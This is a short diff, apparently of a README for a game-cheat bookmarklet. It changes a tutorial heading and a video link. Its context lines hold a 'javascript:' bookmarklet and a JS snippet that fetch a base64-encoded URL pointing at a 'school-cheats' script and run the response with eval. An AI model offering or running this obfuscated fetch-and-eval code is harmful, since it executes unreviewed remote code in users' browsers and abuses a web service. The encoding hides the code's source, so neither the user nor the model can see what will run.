@@ -17,5 +17,5 @@ javascript:fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yY
 ```js
 fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbFNwYW1PcGVuQm94ZXMuanM=')).then((res) => res.text().then((t) => eval(t)))
 ```
-# cool
-file:///home/chronos/u-d21651d33cef254e544b8e9fa51b503f2b21502c/MyFiles/Downloads/Screen%20recording%202021-11-21%2012.17.01%20PM.webm
+# col funni -1 fps tutorial thing i guess
+https://user-images.githubusercontent.com/94798292/142773350-97175967-1b33-42ec-acf0-87f0a88075d0.mp4
